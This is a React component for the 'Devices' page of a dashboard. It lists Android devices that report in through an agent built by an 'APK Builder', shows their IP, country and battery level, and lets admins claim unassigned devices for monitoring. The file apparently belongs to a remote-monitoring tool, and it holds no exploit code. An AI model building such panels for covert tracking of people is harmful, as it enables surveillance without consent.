import React, { useState, useEffect } from "react";
import { Link } from "react-router-dom";
import axios from "axios";
import io from "socket.io-client";
import toast from "react-hot-toast";
import {
  FiSmartphone,
  FiSearch,
  FiFilter,
  FiMoreVertical,
  FiWifi,
  FiGlobe,
  FiBattery,
  FiClock,
  FiPlus,
  FiUserPlus,
  FiX,
  FiRefreshCw,
  FiBell,
  FiLock,
  FiCheckCircle,
} from "react-icons/fi";

const API = import.meta.env.VITE_API_URL || "http://localhost:5000";
const WS_URL = import.meta.env.VITE_API_URL || "http://localhost:5000";

export default function Devices() {
  const [devices, setDevices] = useState([]);
  const [search, setSearch] = useState("");
  const [filter, setFilter] = useState("all");
  const [showClaimModal, setShowClaimModal] = useState(false);
  const [availableDevices, setAvailableDevices] = useState([]);
  const [loadingClaim, setLoadingClaim] = useState(false);

  useEffect(() => {
    // Connect socket first so we don't miss events
    const socket = io(WS_URL, {
      auth: { token: localStorage.getItem("token") },
    });

    // Wait briefly for socket connection then fetch
    socket.on("connect", () => {
      fetchDevices();
    });

    socket.on("device:online", () => fetchDevices());
    socket.on("device:offline", () => fetchDevices());
    socket.on("device:data", () => fetchDevices());

    // Periodic refresh every 5 seconds to catch stale state
    const interval = setInterval(fetchDevices, 5000);

    // Initial fetch immediately too
    fetchDevices();

    return () => {
      socket.close();
      clearInterval(interval);
    };
  }, []);

  const fetchDevices = async () => {
    try {
      const token = localStorage.getItem("token");
      const res = await axios.get(`${API}/api/devices`, {
        headers: { Authorization: `Bearer ${token}` },
      });
      setDevices(res.data);
    } catch (err) {
      toast.error("Failed to fetch devices");
    }
  };

  const fetchAvailableDevices = async () => {
    setLoadingClaim(true);
    try {
      const token = localStorage.getItem("token");
      const res = await axios.get(`${API}/api/devices/all`, {
        headers: { Authorization: `Bearer ${token}` },
      });
      setAvailableDevices(res.data);
    } catch (err) {
      toast.error("Failed to fetch available devices");
    } finally {
      setLoadingClaim(false);
    }
  };

  const claimDevice = async (deviceId) => {
    try {
      const token = localStorage.getItem("token");
      await axios.post(
        `${API}/api/devices/${deviceId}/assign`,
        {},
        {
          headers: { Authorization: `Bearer ${token}` },
        }
      );
      toast.success("Device claimed successfully");
      setShowClaimModal(false);
      fetchDevices();
    } catch (err) {
      toast.error(err.response?.data?.error || "Failed to claim device");
    }
  };

  const requestAccess = async (deviceId) => {
    try {
      const token = localStorage.getItem("token");
      const res = await axios.post(
        `${API}/api/devices/${deviceId}/request-access`,
        {},
        {
          headers: { Authorization: `Bearer ${token}` },
        }
      );
      toast.success("Access request sent to device owner");
    } catch (err) {
      toast.error(err.response?.data?.error || "Failed to request access");
    }
  };

  // Compute effective status based on lastSeen freshness
  const getEffectiveStatus = (device) => {
    // If device is marked offline but was seen within last 120s, show as online
    if (device.status === "offline" && device.lastSeen) {
      const lastSeen = new Date(device.lastSeen).getTime();
      const now = Date.now();
      if (now - lastSeen < 120000) return "online";
    }
    return device.status;
  };

  const filteredDevices = devices
    .map((d) => ({ ...d, _status: getEffectiveStatus(d) }))
    .filter((device) => {
      const matchesSearch =
        device.deviceModel?.toLowerCase().includes(search.toLowerCase()) ||
        device.deviceId?.toLowerCase().includes(search.toLowerCase()) ||
        device.ip?.includes(search) ||
        device.alias?.toLowerCase().includes(search.toLowerCase());

      const status = device._status;
      if (filter === "online") return matchesSearch && status === "online";
      if (filter === "offline") return matchesSearch && status === "offline";
      return matchesSearch;
    });

  const getBatteryColor = (level) => {
    if (!level) return "text-dark-400";
    if (level > 60) return "text-green-400";
    if (level > 20) return "text-yellow-400";
    return "text-red-400";
  };

  // Backend already filters by access; everything here is visible to the user
  const getAccessBadge = () => null;

  return (
    <div className="space-y-8">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-3xl font-bold">Devices</h1>
          <p className="text-dark-400 mt-1">{devices.length} total device(s)</p>
        </div>
        <div className="flex items-center gap-3">
          <button
            onClick={() => {
              setShowClaimModal(true);
              fetchAvailableDevices();
            }}
            className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
          >
            <FiUserPlus className="text-sm" /> Claim Device
          </button>
          <div className="relative">
            <FiSearch className="absolute left-3 top-1/2 -translate-y-1/2 text-dark-400" />
            <input
              type="text"
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              placeholder="Search devices..."
              className="pl-10 pr-4 py-2 rounded-xl bg-dark-700/50 border border-dark-600/50 text-white placeholder-dark-400 focus:outline-none focus:border-primary-500/50 w-64"
            />
          </div>
          <select
            value={filter}
            onChange={(e) => setFilter(e.target.value)}
            className="px-4 py-2 rounded-xl bg-dark-700/50 border border-dark-600/50 text-white focus:outline-none focus:border-primary-500/50"
          >
            <option value="all">All Devices</option>
            <option value="online">Online</option>
            <option value="offline">Offline</option>
          </select>
        </div>
      </div>

      <div className="grid grid-cols-1 gap-4">
        {filteredDevices.length === 0 ? (
          <div className="glass-effect rounded-2xl p-12 text-center">
            <FiSmartphone className="text-5xl mx-auto mb-4 text-dark-500" />
            <p className="text-dark-400 text-lg">No devices found</p>
            <p className="text-dark-500 text-sm mt-2">
              Build and deploy an APK from the APK Builder
            </p>
          </div>
        ) : (
          filteredDevices.map((device) => {
            // Backend guarantees access; no need to re-check here
            return (
              <Link
                key={device.deviceId}
                to={`/devices/${device.deviceId}`}
                className="glass-effect rounded-2xl p-5 card-hover flex items-center justify-between group"
              >
                <div className="flex items-center gap-5">
                  <div className="relative">
                    <div
                      className={`w-3 h-3 rounded-full ${
                        device._status === "online"
                          ? "bg-green-400 shadow-lg shadow-green-400/30 animate-pulse"
                          : "bg-dark-500"
                      }`}
                    />
                  </div>
                  <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-primary-500/20 to-purple-500/20 flex items-center justify-center">
                    <FiSmartphone className="text-primary-400 text-xl" />
                  </div>
                  <div>
                    <div className="flex items-center gap-2">
                      <p className="font-semibold text-lg">
                        {device.alias || device.deviceModel || "Unknown Device"}
                      </p>
                      {getAccessBadge(device)}
                    </div>
                    <div className="flex items-center gap-4 mt-1 text-sm text-dark-400">
                      <span>
                        {device.os} {device.osVersion}
                      </span>
                      <span>·</span>
                      <span className="flex items-center gap-1">
                        <FiGlobe className="text-xs" />
                        {device.country || "Unknown"}
                      </span>
                      {device.batteryLevel && (
                        <>
                          <span>·</span>
                          <span
                            className={`flex items-center gap-1 ${getBatteryColor(
                              device.batteryLevel
                            )}`}
                          >
                            <FiBattery className="text-xs" />
                            {device.batteryLevel}%
                          </span>
                        </>
                      )}
                    </div>
                  </div>
                </div>

                <div className="flex items-center gap-4">
                  <div className="text-right text-sm">
                    <p className="text-dark-400">{device.ip}</p>
                    <p className="text-dark-500 text-xs mt-0.5">
                      {device.lastSeen
                        ? new Date(device.lastSeen).toLocaleString()
                        : "Never"}
                    </p>
                  </div>
                  <div
                    className={`px-3 py-1.5 rounded-full text-xs font-medium ${
                      device._status === "online"
                        ? "bg-green-500/10 text-green-400 border border-green-500/20"
                        : "bg-dark-600/50 text-dark-400 border border-dark-600/30"
                    }`}
                  >
                    {device._status}
                  </div>
                </div>
              </Link>
            );
          })
        )}
      </div>

      {/* Claim Device Modal */}
      {showClaimModal && (
        <div className="fixed inset-0 bg-black/60 z-50 flex items-center justify-center p-4">
          <div className="bg-dark-800 rounded-2xl p-6 w-full max-w-lg border border-dark-700">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-semibold">Claim Available Device</h3>
              <button
                onClick={() => setShowClaimModal(false)}
                className="p-2 rounded-lg hover:bg-dark-700 transition-all"
              >
                <FiX />
              </button>
            </div>
            <p className="text-sm text-dark-400 mb-4">
              These devices have connected to the server but are not yet
              assigned to any admin. Claim one to start monitoring it.
            </p>
            {loadingClaim ? (
              <div className="text-center py-8">
                <FiRefreshCw className="text-2xl animate-spin text-primary-400 mx-auto" />
                <p className="text-dark-400 text-sm mt-2">
                  Scanning for devices...
                </p>
              </div>
            ) : availableDevices.length === 0 ? (
              <div className="text-center py-8 text-dark-400">
                <FiSmartphone className="text-3xl mx-auto mb-2 opacity-50" />
                <p>No available devices found</p>
                <p className="text-xs mt-1 text-dark-500">
                  Make sure the Android agent is running
                </p>
                <button
                  onClick={fetchAvailableDevices}
                  className="mt-3 text-sm text-primary-400 hover:text-primary-300"
                >
                  Refresh
                </button>
              </div>
            ) : (
              <div className="space-y-2 max-h-96 overflow-y-auto">
                {availableDevices.map((device) => (
                  <div
                    key={device.deviceId}
                    className={`p-4 rounded-xl border ${
                      device.adminId &&
                      device.adminId !== localStorage.getItem("token")
                        ? "bg-dark-700/30 border-dark-600/50"
                        : "bg-dark-700/50 border-primary-500/30"
                    }`}
                  >
                    <div className="flex items-center justify-between">
                      <div>
                        <p className="font-medium">
                          {device.alias ||
                            device.deviceModel ||
                            "Unknown Device"}
                        </p>
                        <p className="text-xs text-dark-400 mt-1">
                          ID: {device.deviceId} · IP: {device.ip}
                        </p>
                        <div className="flex items-center gap-2 mt-2">
                          <span
                            className={`px-2 py-0.5 rounded-full text-xs ${
                              device.status === "online"
                                ? "bg-green-500/10 text-green-400"
                                : "bg-dark-600/50 text-dark-400"
                            }`}
                          >
                            {device.status}
                          </span>
                          {device.adminId ? (
                            <span className="px-2 py-0.5 rounded-full text-xs bg-primary-500/10 text-primary-400">
                              Assigned
                            </span>
                          ) : (
                            <span className="px-2 py-0.5 rounded-full text-xs bg-orange-500/10 text-orange-400">
                              Unassigned
                            </span>
                          )}
                        </div>
                      </div>
                      {(!device.adminId || device.adminId === undefined) && (
                        <button
                          onClick={() => claimDevice(device.deviceId)}
                          className="flex items-center gap-1 px-3 py-1.5 rounded-lg bg-primary-500/20 text-primary-400 hover:bg-primary-500/30 text-sm"
                        >
                          <FiPlus className="text-xs" /> Claim
                        </button>
                      )}
                    </div>
                  </div>
                ))}
              </div>
            )}
            <button
              onClick={() => setShowClaimModal(false)}
              className="w-full mt-4 py-2.5 rounded-xl bg-dark-700/50 hover:bg-dark-700 text-sm transition-all"
            >
              Close
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
